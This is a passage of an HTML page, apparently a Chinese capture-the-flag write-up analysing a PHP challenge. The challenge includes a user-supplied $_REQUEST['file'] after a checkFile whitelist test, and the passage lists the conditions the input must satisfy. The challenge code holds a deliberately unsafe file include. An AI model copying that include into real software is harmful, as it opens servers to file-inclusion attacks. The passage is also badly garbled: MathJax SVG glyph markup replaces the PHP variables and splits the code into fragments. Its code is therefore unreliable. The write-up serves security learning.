<path stroke-width="1" id="E1-MJMATHI-55" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path>
<path stroke-width="1" id="E1-MJMATHI-53" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path>
<path stroke-width="1" id="E1-MJMATHI-54" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path>
<path stroke-width="1" id="E1-MJMAIN-5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path>
<path stroke-width="1" id="E1-MJMATHI-66" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path>
<path stroke-width="1" id="E1-MJMATHI-69" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-6C" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
<path stroke-width="1" id="E1-MJMAIN-5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path>
<path stroke-width="1" id="E1-MJMAIN-29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-52" x="0" y="-213"></use>
 <use xlink:href="#E1-MJMATHI-45" x="637" y="0"></use>
 <use xlink:href="#E1-MJMATHI-51" x="1401" y="0"></use>
 <use xlink:href="#E1-MJMATHI-55" x="2193" y="0"></use>
 <use xlink:href="#E1-MJMATHI-45" x="2960" y="0"></use>
 <use xlink:href="#E1-MJMATHI-53" x="3725" y="0"></use>
 <use xlink:href="#E1-MJMATHI-54" x="4370" y="0"></use>
<g transform="translate(5075,0)">
 <use xlink:href="#E1-MJMAIN-5B" x="0" y="0"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="393" y="583"></use>
</g>
 <use xlink:href="#E1-MJMATHI-66" x="5648" y="0"></use>
 <use xlink:href="#E1-MJMATHI-69" x="6198" y="0"></use>
 <use xlink:href="#E1-MJMATHI-6C" x="6544" y="0"></use>
<g transform="translate(6842,0)">
 <use xlink:href="#E1-MJMATHI-65" x="0" y="0"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="659" y="583"></use>
</g>
 <use xlink:href="#E1-MJMAIN-5D" x="7604" y="0"></use>
 <use xlink:href="#E1-MJMAIN-29" x="7882" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2F" x="8272" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2F" x="8772" y="0"></use>
</g>
</svg>_REQUEST[&#39;file&#39;]可以通过checkFile函数的检验     ) &#123;         include <svg xmlns:xlink="http://www.w3.org/1999/xlink" width="26ex" height="3.343ex" style="vertical-align: -1.171ex;" viewBox="0 -934.9 11194.6 1439.2" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">_REQUEST['file']; //包含</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-52" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path>
<path stroke-width="1" id="E1-MJMATHI-45" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path>
<path stroke-width="1" id="E1-MJMATHI-51" d="M399 -80Q399 -47 400 -30T402 -11V-7L387 -11Q341 -22 303 -22Q208 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435Q740 255 592 107Q529 47 461 16L444 8V3Q444 2 449 -24T470 -66T516 -82Q551 -82 583 -60T625 -3Q631 11 638 11Q647 11 649 2Q649 -6 639 -34T611 -100T557 -165T481 -194Q399 -194 399 -87V-80ZM636 468Q636 523 621 564T580 625T530 655T477 665Q429 665 379 640Q277 591 215 464T153 216Q153 110 207 59Q231 38 236 38V46Q236 86 269 120T347 155Q372 155 390 144T417 114T429 82T435 55L448 64Q512 108 557 185T619 334T636 468ZM314 18Q362 18 404 39L403 49Q399 104 366 115Q354 117 347 117Q344 117 341 117T337 118Q317 118 296 98T274 52Q274 18 314 18Z"></path>
<path stroke-width="1" id="E1-MJMATHI-55" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path>
<path stroke-width="1" id="E1-MJMATHI-53" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path>
<path stroke-width="1" id="E1-MJMATHI-54" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path>
<path stroke-width="1" id="E1-MJMAIN-5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path>
<path stroke-width="1" id="E1-MJMATHI-66" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path>
<path stroke-width="1" id="E1-MJMATHI-69" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-6C" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
<path stroke-width="1" id="E1-MJMAIN-5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path>
<path stroke-width="1" id="E1-MJMAIN-3B" d="M78 370Q78 394 95 412T138 430Q162 430 180 414T199 371Q199 346 182 328T139 310T96 327T78 370ZM78 60Q78 85 94 103T137 121Q202 121 202 8Q202 -44 183 -94T144 -169T118 -194Q115 -194 106 -186T95 -174Q94 -171 107 -155T137 -107T160 -38Q161 -32 162 -22T165 -4T165 4Q165 5 161 4T142 0Q110 0 94 18T78 60Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-52" x="0" y="-213"></use>
 <use xlink:href="#E1-MJMATHI-45" x="637" y="0"></use>
 <use xlink:href="#E1-MJMATHI-51" x="1401" y="0"></use>
 <use xlink:href="#E1-MJMATHI-55" x="2193" y="0"></use>
 <use xlink:href="#E1-MJMATHI-45" x="2960" y="0"></use>
 <use xlink:href="#E1-MJMATHI-53" x="3725" y="0"></use>
 <use xlink:href="#E1-MJMATHI-54" x="4370" y="0"></use>
<g transform="translate(5075,0)">
 <use xlink:href="#E1-MJMAIN-5B" x="0" y="0"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="393" y="583"></use>
</g>
 <use xlink:href="#E1-MJMATHI-66" x="5648" y="0"></use>
 <use xlink:href="#E1-MJMATHI-69" x="6198" y="0"></use>
 <use xlink:href="#E1-MJMATHI-6C" x="6544" y="0"></use>
<g transform="translate(6842,0)">
 <use xlink:href="#E1-MJMATHI-65" x="0" y="0"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="659" y="583"></use>
</g>
 <use xlink:href="#E1-MJMAIN-5D" x="7604" y="0"></use>
 <use xlink:href="#E1-MJMAIN-3B" x="7882" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2F" x="8327" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2F" x="8828" y="0"></use>
<g transform="translate(9328,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">包</text>
</g>
<g transform="translate(10261,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">含</text>
</g>
</g>
</svg>_REQUEST[&#39;file&#39;]         exit;     &#125; else &#123;         echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;; //打印表情     &#125;  </code></p>
<p>通过这段代码我知道构造需要满足三个条件：</p>
<ol>
<li><code>$_REQUEST[&#39;file&#39;]内的值不为空</code></li>
<li><code>$_REQUEST[&#39;file&#39;]内的内容是字符</code></li>
<li><code>$_REQUEST[&#39;file&#39;]可以通过checkFile函数的检验 </code></li>
</ol>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="查看checkFile函数内容代码"><a href="#查看checkFile函数内容代码" class="headerlink" title="查看checkFile函数内容代码"></a>查看<code>checkFile函数内容代码</code></h2><p>`if (! isset(<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="16.536ex" height="2.843ex" style="vertical-align: -0.838ex; margin-left: -0.089ex;" viewBox="-38.5 -863.1 7119.5 1223.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">page)&nbsp;||&nbsp;!is_string(</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-67" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
<path stroke-width="1" id="E1-MJMAIN-29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path>
<path stroke-width="1" id="E1-MJMAIN-7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path>
<path stroke-width="1" id="E1-MJMAIN-21" d="M78 661Q78 682 96 699T138 716T180 700T199 661Q199 654 179 432T158 206Q156 198 139 198Q121 198 119 206Q118 209 98 431T78 661ZM79 61Q79 89 97 105T141 121Q164 119 181 104T198 61Q198 31 181 16T139 1Q114 1 97 16T79 61Z"></path>
<path stroke-width="1" id="E1-MJMATHI-69" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-73" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path>
<path stroke-width="1" id="E1-MJMATHI-74" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path>
<path stroke-width="1" id="E1-MJMATHI-72" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMAIN-28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-70" x="0" y="0"></use>
 <use xlink:href="#E1-MJMATHI-61" x="503" y="0"></use>
 <use xlink:href="#E1-MJMATHI-67" x="1033" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="1513" y="0"></use>
 <use xlink:href="#E1-MJMAIN-29" x="1980" y="0"></use>
 <use xlink:href="#E1-MJMAIN-7C" x="2369" y="0"></use>
 <use xlink:href="#E1-MJMAIN-7C" x="2648" y="0"></use>
 <use xlink:href="#E1-MJMAIN-21" x="2926" y="0"></use>
 <use xlink:href="#E1-MJMATHI-69" x="3205" y="0"></use>
<g transform="translate(3550,0)">
 <use xlink:href="#E1-MJMATHI-73" x="0" y="0"></use>
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-73" x="663" y="-213"></use>
</g>
 <use xlink:href="#E1-MJMATHI-74" x="4451" y="0"></use>
 <use xlink:href="#E1-MJMATHI-72" x="4813" y="0"></use>
 <use xlink:href="#E1-MJMATHI-69" x="5264" y="0"></use>
 <use xlink:href="#E1-MJMATHI-6E" x="5610" y="0"></use>
 <use xlink:href="#E1-MJMATHI-67" x="6210" y="0"></use>
 <use xlink:href="#E1-MJMAIN-28" x="6691" y="0"></use>
</g>
</svg>page)) {  //若干$page变量不存在或者不是字符串<br>                echo “you can’t see it”;    //输出you can’t see it<br>                return false;               //返回false<br>            }</p>
<p>            if (in_array(<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="5.335ex" height="2.009ex" style="vertical-align: -0.671ex; margin-left: -0.089ex;" viewBox="-38.5 -576.1 2297 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">page,&nbsp;</title>
<defs aria-hidden="true">
